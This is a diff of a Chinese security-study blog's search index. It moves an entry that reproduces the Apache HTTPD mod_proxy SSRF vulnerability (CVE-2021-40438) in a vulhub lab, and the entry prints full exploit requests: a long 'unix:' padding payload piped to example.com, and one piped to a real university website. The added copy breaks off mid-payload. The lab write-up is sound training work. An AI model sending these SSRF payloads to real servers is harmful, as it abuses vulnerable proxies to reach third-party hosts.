@@ -1,37 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Apache HTTPD 2.4.48 mod_proxy SSRF漏洞(CVE-2021-40438)</title>
-    <url>/2023/11/22/Apache-HTTPD-2-4-48-mod-proxy-SSRF%E6%BC%8F%E6%B4%9E-CVE-2021-40438/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache HTTPD 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）</p>
-<ol>
-<li>复现环境中的SSRF漏洞，截图证明</li>
-<li>尝试利用SSRF漏洞，访问重庆邮电大学官网（<a href="http://www.cqupt.edu.cn/%EF%BC%89">http://www.cqupt.edu.cn/）</a></li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞目录执行如下命令编译及运行一个Apache HTTP Server 2.4.43服务器：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>服务器启动后，访问8080端口可以看到一个Apache Tomcat的示例页面，此时Apache HTTP Server是以中间反代服务器的身份，运行在客户端（用户）和后端服务器（Tomcat）之间，Apache和Tomcat通过AJP协议进行通信。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>发送如下数据包，可见我们已经成功请求到<code>http://example.com</code>的页面并返回：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<img data-src="https://images.gaifagafin.top/202311222300967.png" alt="返回页面" style="zoom:80%;" />
-
-<h1 id="访问重邮官网"><a href="#访问重邮官网" class="headerlink" title="访问重邮官网"></a>访问重邮官网</h1><p>只需要将上面payload的example的url改成重邮的官网，构造http请求：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.cqupt.edu.cn/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>发送请求，成功访问重邮官网</p>
-<img data-src="https://images.gaifagafin.top/202311222300054.png" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
     <url>/2023/11/11/Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
     <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</strong></p>
@@ -68,8 +37,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
         <tag>漏洞</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -125,8 +94,39 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
         <tag>漏洞</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache HTTPD 2.4.48 mod_proxy SSRF漏洞(CVE-2021-40438)</title>
+    <url>/2023/11/22/Apache-HTTPD-2-4-48-mod-proxy-SSRF%E6%BC%8F%E6%B4%9E-CVE-2021-40438/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache HTTPD 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）</p>
+<ol>
+<li>复现环境中的SSRF漏洞，截图证明</li>
+<li>尝试利用SSRF漏洞，访问重庆邮电大学官网（<a href="http://www.cqupt.edu.cn/%EF%BC%89">http://www.cqupt.edu.cn/）</a></li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞目录执行如下命令编译及运行一个Apache HTTP Server 2.4.43服务器：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>服务器启动后，访问8080端口可以看到一个Apache Tomcat的示例页面，此时Apache HTTP Server是以中间反代服务器的身份，运行在客户端（用户）和后端服务器（Tomcat）之间，Apache和Tomcat通过AJP协议进行通信。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>发送如下数据包，可见我们已经成功请求到<code>http://example.com</code>的页面并返回：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA